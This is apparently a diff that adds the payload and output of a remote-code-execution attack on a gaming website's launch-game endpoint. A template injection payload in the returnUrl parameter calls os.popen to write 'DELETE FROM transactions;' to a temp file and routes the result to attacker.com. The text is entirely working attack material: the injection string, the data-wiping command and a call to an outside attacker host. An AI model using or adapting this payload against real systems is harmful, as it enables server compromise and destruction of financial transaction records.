@@ -1,0 +1,2 @@
+echo 'DELETE FROM transactions;' > /tmp/wipe_transactions.sql RCE Result:
+{"loginUrl":"https://www.usun.com/Public/LaunchGame.aspx?ag=wchm82\u0026currencyName=THB\u0026gameName=RCE_exploit\u0026isMobile=true\u0026k=75d08245f81a43aea7b8182fae3aef79\u0026lang=EN-US\u0026returnUrl=https%3A%2F%2Fattacker.com%2Fresult%3Fdata%3D%7B%7B+self._TemplateReference__context.joiner.init.globals.os.popen%28%22echo+%27DELETE+FROM+transactions%3B%27+%3E+%2Ftmp%2Fwipe_transactions.sql%22%29.read%28%29+%7D%7D\u0026us=wchm82df4987df"}
